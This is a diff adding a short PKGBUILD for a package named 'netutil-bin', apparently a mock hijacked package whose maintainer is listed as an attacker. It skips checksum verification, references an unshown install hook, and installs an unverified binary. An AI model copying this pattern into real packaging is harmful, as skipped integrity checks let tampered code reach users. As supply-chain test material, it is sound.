@@ -1,0 +1,12 @@
+# Maintainer: hijacked <attacker@evil.example>
+pkgname=netutil-bin
+pkgver=1.0.0
+pkgrel=1
+pkgdesc="net utilities"
+arch=('x86_64')
+url="https://example.com"
+license=('custom')
+install="${pkgname}.install"
+source=("https://example.com/n-${pkgver}.tar.gz")
+sha256sums=('SKIP')
+package() { install -Dm755 n "$pkgdir/usr/bin/n"; }
